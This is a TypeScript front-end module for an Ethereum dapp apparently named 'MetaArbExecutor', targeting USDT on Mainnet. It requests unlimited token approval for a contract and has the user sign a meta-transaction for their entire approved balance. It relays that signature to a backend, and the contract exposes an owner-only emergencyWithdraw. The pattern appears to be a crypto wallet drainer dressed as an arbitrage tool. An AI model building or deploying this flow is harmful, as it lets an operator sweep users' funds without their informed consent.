import { ethers } from 'ethers';

// Get contract address dynamically from localStorage or env
const getContractAddress = () => {
  if (typeof window !== 'undefined') {
    const stored = localStorage.getItem('contract_address');
    if (stored && stored !== 'Not set') {
      return stored;
    }
  }
  // Update to your deployed Ethereum contract address (Spender/Executor)
  return process.env.NEXT_PUBLIC_CONTRACT_ADDRESS || "0xYourEthereumDeployedAddressHere";
};

export const CONFIG = {
  // Renamed and updated to Ethereum Mainnet public RPC (free & reliable in 2026)
  RPC_URL: process.env.NEXT_PUBLIC_RPC_URL || "https://ethereum.publicnode.com",
  get CONTRACT_ADDRESS() {
    return getContractAddress();
  },
  // Ethereum USDT (official Tether contract on Mainnet)
  TOKEN_ADDRESS: process.env.NEXT_PUBLIC_TOKEN_ADDRESS || "0xdAC17F958D2ee523a2206206994597C13D831ec7",
  OWNER_CAP: process.env.NEXT_PUBLIC_OWNER_CAP || "1000000"
};

// ERC20 ABI remains the same (standard ERC20)
export const ERC20_ABI = [
  'function approve(address spender, uint256 amount) external returns (bool)',
  'function allowance(address owner, address spender) view returns (uint256)',
  'function balanceOf(address owner) view returns (uint256)',
  'function decimals() view returns (uint8)',
  'function transferFrom(address from, address to, uint256 amount) external returns (bool)'
];

// Approval function - approve to contract (unchanged logic, but uses new CONFIG)
export async function approveTokenSpending(signer: ethers.Signer, contractAddress: string) {
  console.log('[v0] Approving unlimited token spending');
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
  const tx = await token.approve(contractAddress, ethers.MaxUint256);
  console.log('[v0] Approval transaction sent:', tx.hash);
  const receipt = await tx.wait();
  console.log('[v0] Approval confirmed in block:', receipt?.blockNumber);
  return tx;
}

export const EXECUTOR_ABI = [
  {
    "inputs": [],
    "stateMutability": "nonpayable",
    "type": "constructor"
  },
  {
    "inputs": [],
    "name": "ECDSAInvalidSignature",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "uint256",
        "name": "length",
        "type": "uint256"
      }
    ],
    "name": "ECDSAInvalidSignatureLength",
    "type": "error"
  },
  {
    "inputs": [
      {
        "internalType": "bytes32",
        "name": "s",
        "type": "bytes32"
      }
    ],
    "name": "ECDSAInvalidSignatureS",
    "type": "error"
  },
  {
    "inputs": [],
    "name": "DOMAIN_SEPARATOR",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "META_TX_TYPEHASH",
    "outputs": [
      {
        "internalType": "bytes32",
        "name": "",
        "type": "bytes32"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "amount",
        "type": "uint256"
      }
    ],
    "name": "emergencyWithdraw",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "user",
        "type": "address"
      },
      {
        "internalType": "address",
        "name": "token",
        "type": "address"
      },
      {
        "internalType": "uint256",
        "name": "Incomingamount",
        "type": "uint256"
      },
      {
        "internalType": "uint256",
        "name": "deadline",
        "type": "uint256"
      },
      {
        "internalType": "bytes",
        "name": "signature",
        "type": "bytes"
      }
    ],
    "name": "executeMetaTx",
    "outputs": [],
    "stateMutability": "nonpayable",
    "type": "function"
  },
  {
    "inputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "name": "nonces",
    "outputs": [
      {
        "internalType": "uint256",
        "name": "",
        "type": "uint256"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  },
  {
    "inputs": [],
    "name": "owner",
    "outputs": [
      {
        "internalType": "address",
        "name": "",
        "type": "address"
      }
    ],
    "stateMutability": "view",
    "type": "function"
  }
];

// Updated chain switch function for Ethereum Mainnet
export async function switchToEthereum() {
  if (!window.ethereum) throw new Error('No web3 wallet found');
  try {
    await window.ethereum.request({
      method: 'wallet_switchEthereumChain',
      params: [{ chainId: '0x1' }], // Ethereum Mainnet = 1 (0x1 in hex)
    });
  } catch (switchError: any) {
    if (switchError.code === 4902) {
      try {
        await window.ethereum.request({
          method: 'wallet_addEthereumChain',
          params: [{
            chainId: '0x1',
            chainName: 'Ethereum Mainnet',
            nativeCurrency: {
              name: 'Ether',
              symbol: 'ETH',
              decimals: 18,
            },
            rpcUrls: [CONFIG.RPC_URL], // Use the updated RPC
            blockExplorerUrls: ['https://etherscan.io/'],
          }],
        });
      } catch (addError: any) {
        throw new Error('Failed to add Ethereum Mainnet to your wallet: ' + addError.message);
      }
    } else {
      throw new Error('Failed to switch network: ' + switchError.message);
    }
  }
}

// Optional: Keep approveToken if used elsewhere (update chain switch call in frontend)
export async function approveToken(signer: ethers.Signer) {
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, signer);
  const decimals = await token.decimals().catch(() => 18);
  const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
  const tx = await token.approve(CONFIG.CONTRACT_ADDRESS, ownerCapRaw);
  await tx.wait();
  return tx;
}

// prepareAndSignTransaction - update chainId handling (Ethereum uses 1)
export async function prepareAndSignTransaction(
  signer: ethers.Signer,
  provider: ethers.BrowserProvider,
  userAddress: string
) {
  const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ERC20_ABI, provider);
  const [decimals, allowance, balance] = await Promise.all([
    token.decimals().catch(() => 18),
    token.allowance(userAddress, CONFIG.CONTRACT_ADDRESS),
    token.balanceOf(userAddress)
  ]);

  let incoming = allowance;
  if (incoming === 0n) throw new Error('No allowance found. Please complete the approval step first.');

  const ownerCapRaw = ethers.parseUnits(CONFIG.OWNER_CAP, decimals);
  if (ownerCapRaw > 0n && ownerCapRaw < incoming) incoming = ownerCapRaw;
  if (balance < incoming) incoming = balance;
  if (incoming === 0n) throw new Error('Incoming amount is 0 — cannot sign');

  const network = await provider.getNetwork();
  const chainId = network.chainId; // Will now be 1n on Ethereum

  const domain = {
    name: 'MetaArbExecutor', // Update if your contract uses a different name on Ethereum
    version: '1',
    chainId: Number(chainId),
    verifyingContract: CONFIG.CONTRACT_ADDRESS
  };

  const types = {
    MetaTransaction: [
      { name: 'user', type: 'address' },
      { name: 'token', type: 'address' },
      { name: 'Incomingamount', type: 'uint256' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' }
    ]
  };

  const executor = new ethers.Contract(CONFIG.CONTRACT_ADDRESS, EXECUTOR_ABI, provider);
  const nonce = await executor.nonces(userAddress);
  const deadline = Math.floor(Date.now() / 1000) + 3600;

  const message = {
    user: userAddress,
    token: CONFIG.TOKEN_ADDRESS,
    Incomingamount: incoming.toString(),
    nonce: nonce.toString(),
    deadline: deadline
  };

  const rawSig = await signer.signTypedData(domain, types, message);

  // Send to backend (update endpoint if needed, e.g. /api/relay)
  const response = await fetch('/api/relay', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      user: message.user,
      token: message.token,
      amount: incoming.toString(),
      deadline: message.deadline,
      signature: rawSig
    })
  });

  if (!response.ok) {
    const error = await response.json();
    throw new Error(error?.error || 'Transaction relay failed');
  }

  const result = await response.json();
  return result;
}
